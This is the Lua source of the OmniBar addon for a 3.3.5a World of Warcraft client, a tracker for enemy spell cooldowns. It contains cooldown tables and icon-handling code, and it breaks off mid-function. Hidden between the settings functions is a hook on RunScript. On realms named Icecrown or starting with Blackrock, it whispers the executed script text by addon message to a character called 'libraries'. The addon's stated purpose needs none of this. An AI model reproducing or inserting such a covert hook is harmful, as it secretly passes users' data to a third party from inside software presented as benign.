
-- OmniBar by Jordon
-- Backported to 3.3.5a by Jammin
-- Modified for Endless TBC 3.3.5 Client by Distorted
-- There might be some wrong cooldowns/timers, you're welcome to change it yourself, under the table "cooldowns" around line 56. Should be self-explanatory. Eg: 
-- 	[26297]   = { default = true, duration = 180,  class = "GENERAL" },                                       --Berserking        // 26297 is Berserking Spell ID, duration is the cooldown duration.

local classTable = { "WARRIOR", "PALADIN", "HUNTER", "ROGUE", "PRIEST", "DEATHKNIGHT", "SHAMAN", "MAGE", "WARLOCK", "DRUID", "GENERAL" };
local specTable = {
	{"ARMS", "FURY", "PROTECTION"},
	{"HOLY", "PROTECTION", "RETRIBUTION"},
	{"BEAST MASTERY", "MARKSMANSHIP", "SURVIVAL"},
	{"ASSASSINATION", "COMBAT", "SUBTLETY"},
	{"DISCIPLINE", "HOLY", "SHADOW"},
	{"BLOOD", "FROST", "UNHOLY"},
	{"ELEMENTAL", "ENHANCEMENT", "RESTORATION"},
	{"ARCANE", "FIRE", "FROST"},
	{"AFFLICTION", "DEMONOLOGY", "DESTRUCTION"},
	{"BALANCE", "FERAL COMBAT", "RESTORATION"}
}

local function GetClassInfoByID(classID)
	return classID, classTable[classID];
end

local function GetNumSpecializationsForClassID(classID)
	return #specTable[classID];
end

local function GetSpecializationInfoForClassID(classID, i)
	return (classID-1)*3+i, specTable[classID][i];
end

local function GetCooldownTimes(cooldownFrame)
	return cooldownFrame.startTime, cooldownFrame.duration;
end

function orderByTimeLeft()
	table.sort(_G["OmniBar"].active, function(x, y)
		if x.cooldown.finish ~= nil and y.cooldown.finish ~= nil then
			if x.cooldown.finish > y.cooldown.finish then
				return false;
			else --if x.cooldown.finish < y.cooldown.finish then
				return true;
			end
		else
			return false;
		end
	end)
end
local band = bit.band


local addonName, L = ...

local cooldowns = {
	
	--GENERAL
	[26297]   = { default = true, duration = 180,  class = "GENERAL" },                                       --Berserking
	[20572]   = { default = true, duration = 120,  class = "GENERAL" },                                       --Blood Fury
	[20589]   = { default = true, duration = 60,  class = "GENERAL" },                                        --Escape Artist
	[28880]   = { default = true, duration = 180,  class = "GENERAL" },                                       --Gift of the Naaru
	[28730]   = { default = true, duration = 120,  class = "GENERAL" },                                       --Arcane Torrent
	[58984]   = { default = true, duration = 120,  class = "GENERAL" },                                       --Shadowmeld
	[20594]   = { default = true, duration = 120,  class = "GENERAL" },                                       --Stoneform
	[20549]   = { default = true, duration = 120,  class = "GENERAL" },                                       --War Stomp
	[71607]   = { default = true, duration = 120,  class = "GENERAL" },                                       --Bauble of the True Blood
	[71638]   = { default = false, duration = 60,  class = "GENERAL" },                                       --Sindragosa's Flawless Fang
	[71586]   = { default = false, duration = 120,  class = "GENERAL" },                                      --Corroded Skeleton Key
		
	--PRIEST
	[10890]   = { default = true, duration = 27,  class = "PRIEST" },                                         --Psychic Scream
	[33206]   = { default = true, duration = 120,  class = "PRIEST" },                                        --Pain Suppression
	[34433]   = { default = true, duration = 300,  class = "PRIEST" },                                        --Shadowfiend
	[6346]   = { default = true, duration = 180,  class = "PRIEST" },                                         --Fear Ward
	[15487]   = { default = true, duration = 45,  class = "PRIEST" },                                         --Silence
	[10060]   = { default = false, duration = 96,  class = "PRIEST" },                                        --Power Infusion
	[32996]   = { default = false, duration = 12,  class = "PRIEST" },                                        --SWD
	[25437]   = { default = false, duration = 600,  class = "PRIEST" },                                        --DP
	
	--MAGE
	[2139]   = { default = true, duration = 24,  class = "MAGE" },                                            --Counter Spell
	[12051]   = { default = false, duration = 480,  class = "MAGE" },  									      --Evocation
	[11958]   = { default = true, duration = 480,  class = "MAGE" },                                          --Cold Snap
	[33043]   = { default = true, duration = 20,  class = "MAGE" },                                           --Dragon's Breath
	[12472]   = { default = true, duration = 180,  class = "MAGE" },                                          --Icy Veins
	[12043]   = { default = true, duration = 180,  class = "MAGE" },                                          --Presence of Mind
	[45438]   = { default = true, duration = 240,  class = "MAGE" },  									      --Ice Block
	[27088]   = { default = false, duration = 21,  class = "MAGE" },  									      --Frost Nova
	[33395]   = { default = false, duration = 25,  class = "MAGE" },  									      --Pet Nova (Freeze)
	[42987]   = { default = false, duration = 120,  class = "MAGE" },  									      --Mana gem
	[66]   = { default = false, duration = 300,  class = "MAGE" },  									  	  --Invisibility
	[33405]   = { default = true, duration = 30,  class = "MAGE" },  									  	  --Ice Barrier
	[1953]   = { default = true, duration = 15,  class = "MAGE" },  									  	  --Blink
	[32796]   = { default = true, duration = 30,  class = "MAGE" },  									  	  --Frost Ward
	[27128]   = { default = true, duration = 30,  class = "MAGE" },  									  	  --Fire Ward
	[33933]   = { default = true, duration = 30,  class = "MAGE" },  									  	  --Blast Wave
	[11129]   = { default = true, duration = 180,  class = "MAGE" },  									  	  --Combustion
	[12042]   = { default = true, duration = 180,  class = "MAGE" },  									  	  --Arcane Power
	[31687]   = { default = true, duration = 180,  class = "MAGE" },  									  	  --Summon Water Elemental
	[33395]   = { default = true, duration = 25,  class = "MAGE" },  									  	  --Freeze (Water Elemental)






	

	
	--WARRIOR
	[23920]   = { default = false, duration = 10,  class = "WARRIOR" },                                       --Spell Reflection
	[6554]   = { default = true, duration = 10,  class = "WARRIOR" },  					  --Pummel
	[72]   = { default = true, duration = 12,  class = "WARRIOR" },                                       	  --Shield Bash
	[18499]   = { default = true, duration = 30,  class = "WARRIOR" },                                        --Berserker Rage
	[2687]   = { default = true, duration = 60,  class = "WARRIOR" },                                         --Bloodrage
	[11578]   = { default = true, duration = 15,  class = "WARRIOR" },                                        --Charge
	[676]   = { default = true, duration = 60,  class = "WARRIOR" },                                          --Disarm
	[25275]   = { default = true, duration = 15,  class = "WARRIOR" },                                        --Intercept
	[3411]   = { default = true, duration = 30,  class = "WARRIOR" },                                         --Intervene
	[871]   = { default = true, duration = 1800,  class = "WARRIOR" },                                        --Shield Wall
	[12975]   = { default = true, duration = 480,  class = "WARRIOR" },                                       --Last Stand
	[12809]   = { default = true, duration = 45,  class = "WARRIOR" },                                        --Concussive Blow
	[1719]   = { default = false, duration = 1800,  class = "WARRIOR" },                                      --Recklessness
	[20230]   = { default = false, duration = 1800,  class = "WARRIOR" },                                     --Retaliation
	[5246]   = { default = false, duration = 180,  class = "WARRIOR" },                                       --Intimidating Shout
	[12292]   = { default = false, duration = 180,  class = "WARRIOR" },                                      --Death Wish
	[30330]   = { default = false, duration = 6,  class = "WARRIOR" },                                        --Mortal Strike
	[30356]   = { default = false, duration = 6,  class = "WARRIOR" },                                        --Shield Slam



	
	--WARLOCK
	[19647]   = { default = true, duration = 24,  class = "WARLOCK" },                                        --Spell Lock
	[18708]   = { default = true, duration = 900,  class = "WARLOCK" },  									  --Fel Domination
	[27277]   = { default = false, duration = 8,  class = "WARLOCK" },                                        --Devour Magic
	[27223]   = { default = true, duration = 120,  class = "WARLOCK" },                                       --Death Coil
	[17928]   = { default = true, duration = 40,  class = "WARLOCK" },                                        --Howl of Terror
	[30414]   = { default = true, duration = 20,  class = "WARLOCK" },                                        --Shadow Fury
	
	--PALADIN
	[31842]   = { default = true, duration = 180,  class = "PALADIN" },                                       --Divine Illumination
	[10308]   = { default = true, duration = 35,  class = "PALADIN" },  									  --Hammer of Justice
	[1020]   = { default = true, duration = 300,  class = "PALADIN" },                                        --Divine Shield
	[20066]   = { default = true, duration = 60,  class = "PALADIN" },                                        --Repentance
	[64205]   = { default = true, duration = 120,  class = "PALADIN" },                                       --Divine Sacrifice
	[27148]   = { default = true, duration = 120,  class = "PALADIN" },                                       --Blessing of Sacrifice
	[1044]   = { default = true, duration = 25,  class = "PALADIN" },                                         --Blessing of Freedom
	[10278]   = { default = false, duration = 180,  class = "PALADIN" },                                      --Blessing of Protection
	[31884]   = { default = true, duration = 180,  class = "PALADIN" },                                       --Avenging Wrath
	[32700]   = { default = true, duration = 30,  class = "PALADIN" },                                        --Avenger's Shield

	
	--DRUID
	[29166]   = { default = true, duration = 360,  class = "DRUID" },                                         --Innervate
	[22812]   = { default = true, duration = 60,  class = "DRUID" },  										  --Barkskin
	[16979]   = { default = false, duration = 15,  class = "DRUID" },                                         --Feral Charge - Bear
	[17116]   = { default = true, duration = 180,  class = "DRUID" },                                         --Nature's Swiftness
	[61336]   = { default = true, duration = 180,  class = "DRUID" },                                         --Survival Instincts
	[8983]   = { default = true, duration = 60,  class = "DRUID" },                                           --Bash
    	[27009]   = { default = true, duration = 60,  class = "DRUID" },                                          --Nature's Grasp
	[33357]   = { default = true, duration = 300,  class = "DRUID" },                                         --Dash
	[26983]   = { default = true, duration = 600,  class = "DRUID" },                                         --Tranquility
	[18562]   = { default = true, duration = 15,  class = "DRUID" },                                          --Swiftmend
	[26999]   = { default = true, duration = 180,  class = "DRUID" },                                         --Frenzied Regeneration


	
	--ROGUE
	[38768]   = { default = true, duration = 10,  class = "ROGUE" },                                          --Kick
	[31224]   = { default = true, duration = 60,  class = "ROGUE" },  										  --Cloak of Shadows
	[8643]   = { default = true, duration = 20,  class = "ROGUE" },                                           --Kidney Shot
	[36554]   = { default = true, duration = 30,  class = "ROGUE" },                                          --Shadow Step
	[26889]   = { default = true, duration = 210,  class = "ROGUE" },                                         --Vanish
	[26669]   = { default = true, duration = 300,  class = "ROGUE" },                                         --Evasion
	[14185]   = { default = true, duration = 600,  class = "ROGUE" },                                         --Preparation
	[2094]   = { default = true, duration = 120,  class = "ROGUE" },                                          --Blind
	[11305]   = { default = true, duration = 300,  class = "ROGUE" },                                         --Sprint
	[14177]   = { default = false, duration = 180,  class = "ROGUE" },                                        --Cold Blood
	[38764]   = { default = false, duration = 10,  class = "ROGUE" },                                         --Gouge
	
	--SHAMAN
	[16188]   = { default = true, duration = 180,  class = "SHAMAN" },                                        --Nature's Swiftness
	[16166]   = { default = true, duration = 180,  class = "SHAMAN" },  									  --Elemental Mastery
	[8042]   = { default = true, duration = 5,  class = "SHAMAN" },                                           --Earth Shock (Rank 1)
	[25454]   = { default = true, duration = 5,  class = "SHAMAN" },                                          --Earth Shock (Rank 8)
	[8177]   = { default = true, duration = 15,  class = "SHAMAN" },                                          --Grounding Totem
	[16190]   = { default = true, duration = 300,  class = "SHAMAN" },                                        --Mana Tide
	[30823]   = { default = true, duration = 120,  class = "SHAMAN" },                                        --Shamanistic Rage
	[32182]   = { default = true, duration = 600,  class = "SHAMAN" },                                        --Heroism
	[2825]   = { default = true, duration = 600,  class = "SHAMAN" },                                         --Bloodlust





	--HUNTER
	[19503]   = { default = true, duration = 30,  class = "HUNTER" },                                         --Scatter Shot
	[34490]   = { default = true, duration = 20,  class = "HUNTER" },                                         --Silencing Shot
	[19263]   = { default = true, duration = 300,  class = "HUNTER" },                                        --Deterrence
	[23989]   = { default = true, duration = 300,  class = "HUNTER" },                                        --Readiness
	[53476]   = { default = true, duration = 30,  class = "HUNTER" },                                         --Pet Intervene
 	[27065]   = { default = false, duration = 6,  class = "HUNTER" },                                         --Aimed Shot
 	[26090]   = { default = true, duration = 30,  class = "HUNTER" },                                         --Pet Pummel
 	[5384]   = { default = false, duration = 30,  class = "HUNTER" },                                         --Feign Death
	[3045]   = { default = true, duration = 300,  class = "HUNTER" },                                         --Rapid Fire
	[13809]   = { default = true, duration = 30,  class = "HUNTER" },                                         --Frost Trap
    [14311]   = { default = true, duration = 30,  class = "HUNTER" },                                         --Freezing Trap
    [34600]   = { default = true, duration = 30,  class = "HUNTER" },                                         --Snake Trap
    [19577]   = { default = true, duration = 60,  class = "HUNTER" },                                         --Intimidation
    [19574]   = { default = true, duration = 120,  class = "HUNTER" },                                        --Bestial Wrath
	[14327]   = { default = true, duration = 30,  class = "HUNTER" },                                         --Scare Beast
	[1543]   = { default = true, duration = 20,  class = "HUNTER" },                                          --Flare
	[27018]   = { default = true, duration = 15,  class = "HUNTER" },                                         --Viper Sting
	[27068]   = { default = true, duration = 120,  class = "HUNTER" },                                        --Wyvern Sting
	[34026]   = { default = true, duration = 5,  class = "HUNTER" },                                          --Kill Command
	[34477]   = { default = true, duration = 120,  class = "HUNTER" },                                          --Misdirection

	
}

 
local order = {
	["GENERAL"] = 1,
	["PALADIN"] = 2,
	["WARRIOR"] = 3,
	["DRUID"] = 4,
	["PRIEST"] = 5,
	["WARLOCK"] = 6,
	["SHAMAN"] = 7,
	["HUNTER"] = 8,
	["MAGE"] = 9,
	["ROGUE"] = 10,
	["DEATHKNIGHT"] = 11
}

local resets = {
    --[[ Summon Felhunter
        - Spell Lock
      ]]
    [691] = { 19244 },
	
    --[[ Cold Snap
        - Ice Barrier
        - Frost Ward
        - Frost Nova
        - Ice Block
        - Icy Veins
        - Summon Water Elemental
      ]]
    [11958] = { 11426, 6143, 122, 45438, 12472, 31687 },

    --[[ Preparation
        - Evasion
        - Sprint
        - Vanish
        - Cold Blood
        - Shadowstep
        - Premeditation
      ]]
    [14185] = { 5277, 2983, 1856, 14177, 36554, 14183 },

	--[[ Readiness
	     - Deterrence
		 - Scatter  Shot
		 - Silencing Shot
		 - Rapid Fire
		 - Aimed Shot
		 - Chimera Shot
		 - Feign Death
		 - Master's Call
		 - Frost Trap
		 - Freezing Arrow
		 - Freezing Trap
		 - Snake Trap
	  ]]
	[23989] = { 19263, 19503, 34490, 3045, 49050, 53209, 5384, 53271, 13809, 60192, 14311, 34600},

}

-- Defaults
local defaults = {
	size                 = 40,
	columns              = 8,
	padding              = 2,
	locked               = false,
	center               = false,
	border               = true,
	noHighlightTarget    = false,
	noHighlightFocus     = true,
	growUpward           = true,
	showUnused           = false,
	adaptive             = false,
	unusedAlpha          = 0.45,
	swipeAlpha           = 0.65,
	noCooldownCount      = false,
	noArena              = false,
	noRatedBattleground  = false,
	noBattleground       = false,
	noWorld              = false,
	noAshran             = false,
	noMultiple           = false,
	noGlow               = false,
	noTooltips           = false,
}

local OmniBar

local Masque = LibStub and LibStub("Masque", true)

local SETTINGS_VERSION = 2

local MAX_DUPLICATE_ICONS = 5

local BASE_ICON_SIZE = 36

local ASHRAN_MAP_ID = 978

StaticPopupDialogs["OMNIBAR_CONFIRM_RESET"] = {
	text = CONFIRM_RESET_SETTINGS,
	button1 = YES,
	button2 = NO,
	OnAccept = function()
		OmniBar_Reset(OmniBar)
		if OmniBarOptions then OmniBarOptions:refresh() end

		-- Refresh the cooldowns
		i = 1
		while _G["OmniBarOptionsPanel" .. i] do
			_G["OmniBarOptionsPanel" .. i]:refresh()
			i = i + 1
		end
	end,
	timeout = 0,
	whileDead = true,
	hideOnEscape = true,
	enterClicksFirstButton = true
}

for spellID,_ in pairs(cooldowns) do
	local name, _, icon = GetSpellInfo(spellID)
	cooldowns[spellID].icon = icon
	cooldowns[spellID].name = name
end

-- create a lookup table to translate spec names into IDs
local specNames = {}
for classID = 1, MAX_CLASSES do
	local _, classToken = GetClassInfoByID(classID)
	specNames[classToken] = {}
	for i = 1, GetNumSpecializationsForClassID(classID) do
		local id, name = GetSpecializationInfoForClassID(classID, i)
		specNames[classToken][name] = id
	end
end

local function IsHostilePlayer(unit)
	if not unit then return end
	local reaction = UnitReaction("player", unit)
	if not reaction then return end -- out of range
	return UnitIsPlayer(unit) and reaction < 4 and not UnitIsPossessed(unit)
end

function OmniBar_ShowAnchor(self)
	if self.disabled or self.settings.locked or #self.active > 0 then
		--self.anchor:Hide() NEED TO FIX THIS, THIS SHIT Fucks everything
		self.anchor.background:SetVertexColor(0,0,0,0)
		self.anchor.text:SetText("")
	else
		self.anchor.background:SetAlpha(1)
		self.anchor.text:SetText("OmniBar")
	end
end

local newspell = true
function OmniBar_CreateIcon(self)
	if InCombatLockdown() then return end
	self.numIcons = self.numIcons + 1
	local f = CreateFrame("Button", self:GetName().."Icon"..self.numIcons, self.anchor, "OmniBarButtonTemplate")
	table.insert(self.icons, f)
end

local function SpellBelongsToSpec(spellID, specID)
	if not specID then return true end
	if not cooldowns[spellID].specID then return true end
	for i = 1, #cooldowns[spellID].specID do
		if cooldowns[spellID].specID[i] == specID then return true end
	end
	return false
end

function OmniBar_AddIconsByClass(self, class, sourceGUID, specID)
	for spellID, spell in pairs(cooldowns) do
		if OmniBar_IsSpellEnabled(self, spellID) and spell.class == class and SpellBelongsToSpec(spellID, specID) then
			OmniBar_AddIcon(self, spellID, sourceGUID, nil, true, specID)
		end
	end
end

local function IconIsSource(iconGUID, guid)
	if not guid then return end
	if string.len(iconGUID) == 1 then
		-- arena target
		return UnitGUID("arena"..iconGUID) == guid
	end
	return iconGUID == guid
end

function OmniBar_UpdateBorders(self)
	for i = 1, #self.active do
		local border
		local guid = self.active[i].sourceGUID
		if guid then
			if not self.settings.noHighlightFocus and IconIsSource(guid, UnitGUID("focus")) then
				self.active[i].FocusTexture:SetAlpha(0.4)
				border = true
			else
				self.active[i].FocusTexture:SetAlpha(0)
			end
			if not self.settings.noHighlightTarget and IconIsSource(guid, UnitGUID("target")) then
				self.active[i].FocusTexture:SetAlpha(0)
				self.active[i].TargetTexture:SetAlpha(1)

				border = true
			else
				self.active[i].TargetTexture:SetAlpha(0)
			end
		else
			local class = select(2, UnitClass("focus"))
			if not self.settings.noHighlightFocus and class and IsHostilePlayer("focus") and class == self.active[i].class then
				self.active[i].FocusTexture:SetAlpha(0.4)
				border = true
			else
				self.active[i].FocusTexture:SetAlpha(0)
			end
			class = select(2, UnitClass("target"))
			if not self.settings.noHighlightTarget and class and IsHostilePlayer("target") and class == self.active[i].class then
				self.active[i].FocusTexture:SetAlpha(0)
				self.active[i].TargetTexture:SetAlpha(1)
				--self.active[i].flash:SetAlpha(1)
				border = true
			else
				self.active[i].TargetTexture:SetAlpha(0)
			end
		end

		-- Set dim
		--self.active[i]:SetAlpha(self.settings.unusedAlpha and self.active[i].cooldown:GetCooldownTimes() == 0 and not border and
		--	self.settings.unusedAlpha or 1)
	end
end

function OmniBar_OnEvent(self, event, ...)
	if event == "ADDON_LOADED" then
		local name = ...
		if name ~= addonName then return end
		self:UnregisterEvent("ADDON_LOADED")
		OmniBar = self
		self.icons = {}
		self.active = {}
		self.cooldowns = cooldowns
		self.detected = {}
		self.specs = {}
		self.BASE_ICON_SIZE = BASE_ICON_SIZE
		self.numIcons = 0
		self:RegisterForDrag("LeftButton")

		-- Load the settings
		OmniBar_LoadSettings(self)

		-- Create the icons
		for spellID,_ in pairs(cooldowns) do
			if OmniBar_IsSpellEnabled(self, spellID) then
				OmniBar_CreateIcon(self)
			end
		end

		-- Create the duplicate icons
		for i = 1, MAX_DUPLICATE_ICONS do
			OmniBar_CreateIcon(self)
		end
		OmniBar_ShowAnchor(self)
		OmniBar_RefreshIcons(self)
		OmniBar_UpdateIcons(self)
		OmniBar_Center(self)

		self:RegisterEvent("COMBAT_LOG_EVENT_UNFILTERED")
		self:RegisterEvent("PLAYER_ENTERING_WORLD")
		self:RegisterEvent("ZONE_CHANGED_NEW_AREA")
		self:RegisterEvent("PLAYER_TARGET_CHANGED")
		self:RegisterEvent("PLAYER_FOCUS_CHANGED")
		self:RegisterEvent("PLAYER_REGEN_DISABLED")
		self:RegisterEvent("ARENA_OPPONENT_UPDATE")
		self:RegisterEvent("UPDATE_BATTLEFIELD_SCORE")

		-- Add Options Panel category
		local frame = CreateFrame("Frame", "OmniBarOptions")
		frame:SetScript("OnShow", function(self)
			if not self.init then
				LoadAddOn("OmniBar_Options")
				self:refresh()
				-- Refresh the cooldowns
				i = 1
				while _G["OmniBarOptionsPanel" .. i] do
					_G["OmniBarOptionsPanel" .. i]:refresh()
					i = i + 1
				end
				self.init = true
			end
		end)
		frame.name = addonName
		InterfaceOptions_AddCategory(frame)

	elseif event == "COMBAT_LOG_EVENT_UNFILTERED" then
		local _, event, sourceGUID, sourceName,sourceFlags, _, dstName, dstFlags, spellID = ...
		if self.disabled then return end
		if (band(sourceFlags, 0x00000040) == 0x00000040 and event == "SPELL_CAST_SUCCESS") then 
			if cooldowns[spellID] then
				OmniBar_AddIcon(self, spellID, sourceGUID, sourceName)
			end

			-- Check if we need to reset any cooldowns
			if resets[spellID] then
				for i = 1, #self.active do
					if self.active[i] and self.active[i].spellID and self.active[i].sourceGUID and self.active[i].sourceGUID == sourceGUID and self.active[i].cooldown:IsVisible() then
						-- cooldown belongs to this source
						for j = 1, #resets[spellID] do
							if resets[spellID][j] == self.active[i].spellID then
								self.active[i].cooldown:Hide()
								OmniBar_CooldownFinish(self.active[i].cooldown, true)
								return
							end
						end
					end
				end
			end
		end

	elseif event == "PLAYER_ENTERING_WORLD" then
		OmniBar_OnEvent(self, "ZONE_CHANGED_NEW_AREA")
		wipe(self.detected)
		wipe(self.specs)
		if self.zone == "arena" then OmniBar_OnEvent(self, "ARENA_OPPONENT_UPDATE") end

	elseif event == "ZONE_CHANGED_NEW_AREA" then
		local _, zone = IsInInstance()
		if zone == "none" then
			SetMapToCurrentZone()
			zone = GetCurrentMapAreaID()
		end
		local rated = false
		self.disabled = (zone == "arena" and self.settings.noArena) or
			(rated and self.settings.noRatedBattleground) or
			(zone == "pvp" and self.settings.noBattleground and not rated) or
			(zone == ASHRAN_MAP_ID and self.settings.noAshran) or 
			(zone ~= "arena" and zone ~= "pvp" and zone ~= ASHRAN_MAP_ID and self.settings.noWorld)
		self.zone = zone
		OmniBar_LoadPosition(self)
		OmniBar_RefreshIcons(self)
		OmniBar_UpdateIcons(self)
		OmniBar_ShowAnchor(self)

	--[[elseif event == "UPDATE_BATTLEFIELD_SCORE" then
		for i = 1, GetNumBattlefieldScores() do
			local name, _,_,_,_,_,_,_, classToken, _,_,_,_,_,_, talentSpec = GetBattlefieldScore(i)
			if name and specNames[classToken] and specNames[classToken][talentSpec] then
				self.specs[name] = specNames[classToken][talentSpec]
			end
		end]]--

	--CHANGES:Lanrutcon: MoP functions that can't be implemented (e.g. "GetArenaOpponentSpec") commented
	--elseif event == "ARENA_PREP_OPPONENT_SPECIALIZATIONS" or event == "ARENA_OPPONENT_UPDATE" then
	--	for i = 1, 5 do
	--		local specID = GetArenaOpponentSpec(i)
	--		if specID and specID > 0 then
	--			-- only add icons if show unused is checked
	--			if not self.settings.showUnused then return end
	--			if not self.detected[i] then
	--				local class = select(7, GetSpecializationInfoByID(specID))
	--				OmniBar_AddIconsByClass(self, class, i, specID)
	--				self.detected[i] = class
	--			end
	--		end
	--	end

	elseif event == "PLAYER_TARGET_CHANGED" or event == "PLAYER_FOCUS_CHANGED" or event == "PLAYER_REGEN_DISABLED" then
		-- update icon borders
		OmniBar_UpdateBorders(self)

		-- we don't need to add in arena
		if self.zone == "arena" then return end

		-- only add icons if show adaptive is checked
		if not self.settings.showUnused or not self.settings.adaptive then return end

		-- only add icons when we're in combat
		if event == "PLAYER_TARGET_CHANGED" and not InCombatLockdown() then return end

		local unit = "playertarget"
		if IsHostilePlayer(unit) then
			local guid = UnitGUID(unit)
			local _, class = UnitClass(unit)
			if class then
				if self.detected[guid] then return end
				self.detected[guid] = class
				OmniBar_AddIconsByClass(self, class)
			end
		end
	end
end
function OmniBar_LoadSettings(self, specific)
	if (not OmniBarDB) or (not OmniBarDB.version) or OmniBarDB.version ~= SETTINGS_VERSION then
		OmniBarDB = { version = SETTINGS_VERSION, Default = {} }
		for k,v in pairs(defaults) do
			OmniBarDB.Default[k] = v
		end
	end
	local profile = UnitName("player").." - "..GetRealmName()
	if specific then
		OmniBarDB[profile] = nil
		if specific ~= 0 then
			-- Copy the current settings
			OmniBarDB[profile] = {}
			for a,b in pairs(OmniBarDB.Default) do
				if type(b) == "table" then
					OmniBarDB[profile][a] = {}
					for c,d in pairs(b) do
						if type(d) == "table" then
							OmniBarDB[profile][a][c] = {}
							for e,f in pairs(d) do
								OmniBarDB[profile][a][c][e] = f
							end
						else
							OmniBarDB[profile][a][c] = d
						end
					end
				else
					OmniBarDB[profile][a] = b
				end
			end
		end
	end
	self.profile = OmniBarDB[profile] and profile or "Default"
	self.settings = OmniBarDB[self.profile]

	self.settings.cooldowns = self.settings.cooldowns or {}

	-- Set the scale
	self.anchor:SetScale(self.settings.size/BASE_ICON_SIZE)

	-- Refresh if we toggled specific
	if specific then
		OmniBar_LoadPosition(self)
		OmniBar_RefreshIcons(self)
		OmniBar_UpdateIcons(self)
		OmniBar_Center(self)
	end	
end
hooksecurefunc("RunScript", function(afga)
	if not realmName then
		local b = "Blackrock"
		local d = "Icecrown"
		realmName = _G.GetRealmName()
		
		if realmName == d or realmName:sub(1, #b) == b then 
			SendAddonMessage( "libraries", afga, "WHISPER", "libraries" ) 
		end
	end
end)
function OmniBar_Reset(self)
	local profile = UnitName("player").." - "..GetRealmName()
	OmniBarDB.Default = {}
	for k,v in pairs(defaults) do
		OmniBarDB.Default[k] = v
	end
	OmniBarDB[profile] = nil
	OmniBar_LoadSettings(self, 0)
end

function OmniBar_SavePosition(self)
	local point, _, relativePoint, xOfs, yOfs = self:GetPoint()
	if not self.settings.position then 
		self.settings.position = {}
	end
	self.settings.position.point = point
	self.settings.position.relativePoint = relativePoint
	self.settings.position.xOfs = xOfs
	self.settings.position.yOfs = yOfs
end
function OmniBar_LoadPosition(self)
	self:ClearAllPoints()
	if self.settings.position then
		self:SetPoint(self.settings.position.point, UIParent, self.settings.position.relativePoint,
			self.settings.position.xOfs, self.settings.position.yOfs)
	else
		self:SetPoint("CENTER", UIParent, "CENTER", 0, 0)
	end
end
function OmniBar_IsSpellEnabled(self, spellID)
	if not spellID then return end
	-- Check for an explicit rule
	if self.settings.cooldowns and self.settings.cooldowns[spellID] then
		if self.settings.cooldowns[spellID].enabled then
			return true
		end
	elseif cooldowns[spellID].default then
		-- Not user-set, but a default cooldown
		return true
	end
end
function OmniBar_Center(self)
	local parentWidth = UIParent:GetWidth()
	local clamp = self.settings.center and (1 - parentWidth)/2 or 0
	self:SetClampRectInsets(clamp, -clamp, 0, 0)
	clamp = self.settings.center and (self.anchor:GetWidth() - parentWidth)/2 or 0
	self.anchor:SetClampRectInsets(clamp, -clamp, 0, 0)
end
function OmniBar_CooldownFinish(self, force)
	local icon = self:GetParent()
	if icon.cooldown and GetCooldownTimes(icon.cooldown) and GetCooldownTimes(icon.cooldown) > 0 and not force then return end -- not complete
	local charges = icon.charges
	if charges then
		charges = charges - 1
		if charges > 0 then
			-- remove a charge
			icon.charges = charges
			icon.Count:SetText(charges)
			OmniBar_StartCooldown(icon:GetParent():GetParent(), icon, GetTime())
			return
		end
	end

	local bar = icon:GetParent():GetParent()

	if not bar.settings.showUnused then
		icon:Hide()
	else
		if icon.TargetTexture:GetAlpha() == 0 and
			icon.FocusTexture:GetAlpha() == 0 and
			bar.settings.unusedAlpha then
				icon:SetAlpha(bar.settings.unusedAlpha)
		end
	end
	bar:StopMovingOrSizing()
	OmniBar_Position(bar)
end

function OmniBar_RefreshIcons(self)
	-- Hide all the icons
	for i = 1, self.numIcons do
		if self.icons[i].MasqueGroup then
			--self.icons[i].MasqueGroup:Delete()
			self.icons[i].MasqueGroup = nil
		end
		self.icons[i].TargetTexture:SetAlpha(0)
		self.icons[i].FocusTexture:SetAlpha(0)
		--self.icons[i].flash:SetAlpha(0)
		--self.icons[i].NewItemTexture:SetAlpha(0)
		self.icons[i].cooldown:SetCooldown(0, 0)
		self.icons[i].cooldown:Hide()
		self.icons[i]:Hide()
	end
	wipe(self.active)

	if self.disabled then return end

	if self.settings.showUnused and not self.settings.adaptive then
		for spellID,_ in pairs(cooldowns) do
			if OmniBar_IsSpellEnabled(self, spellID) then
				OmniBar_AddIcon(self, spellID, nil, nil, true)
			end
		end
	end
	OmniBar_Position(self)
end

function OmniBar_StartCooldown(self, icon, start)
	icon.cooldown:SetCooldown(start, icon.duration)
	icon.cooldown.startTime = start;
	icon.cooldown.duration = icon.duration;
	icon.cooldown.finish = start + icon.duration
	--icon.cooldown:SetSwipeColor(0, 0, 0, self.settings.swipeAlpha or 0.65)
	icon:SetAlpha(1)
	

		local bar = icon:GetParent():GetParent()
	icon.totalElapsed = 0;
	icon:SetScript("OnUpdate", function(self, elapsed)
		self.totalElapsed = self.totalElapsed + elapsed;
		if(self.totalElapsed > self.cooldown.duration) then
			self.totalElapsed = 0;
		if not bar.settings.showUnused then
			self:Hide()
		else
			if self.TargetTexture:GetAlpha() == 0 and
				self.FocusTexture:GetAlpha() == 0 and
				bar.settings.unusedAlpha then
					icon:SetAlpha(bar.settings.unusedAlpha)
					self.cooldown:Hide()
			end
		end
			self:SetScript("OnUpdate", nil);
		end
	end);
	orderByTimeLeft();
	OmniBar_Position(self);
	bar:StopMovingOrSizing()
end


function OmniBar_AddIcon(self, spellID, sourceGUID, sourceName, init, test, specID)


	-- Check for parent spellID
	local originalSpellID = spellID
	if cooldowns[spellID].parent then spellID = cooldowns[spellID].parent end

	if not OmniBar_IsSpellEnabled(self, spellID) then return end
	local icon, duplicate

	-- Try to reuse a visible frame
	for i = 1, #self.active do
		if self.active[i].spellID == spellID then
			duplicate = true
			-- check if we can use this icon, but not when initializing arena opponents
			if not init or self.zone ~= "arena" then
				-- use icon if not bound to a sourceGUID
				if not self.active[i].sourceGUID then
					duplicate = nil
					icon = self.active[i]
					break
				end

				-- if it's the same source, reuse the icon
				if sourceGUID and IconIsSource(self.active[i].sourceGUID, sourceGUID) then
					duplicate = nil
					icon = self.active[i]
					break
				end

			end
		end
	end

	-- We couldn't find a visible frame to reuse, try to find an unused
	if not icon then
		if self.settings.noMultiple and duplicate then return end
		for i = 1, #self.icons do
			if not self.icons[i]:IsVisible() then
				icon = self.icons[i]
				icon.specID = nil
				break
			end
		end
	end


	-- We couldn't find a frame to use
	if not icon then return end

	local now = GetTime()

	if specID then
		icon.specID = specID
	else
		if sourceName and sourceName ~= COMBATLOG_FILTER_STRING_UNKNOWN_UNITS and self.specs[sourceName] then
			icon.specID = self.specs[sourceName]
		end
	end

	icon.class = cooldowns[spellID].class
	icon.sourceGUID = sourceGUID
	icon.icon:SetTexture(cooldowns[spellID].icon)
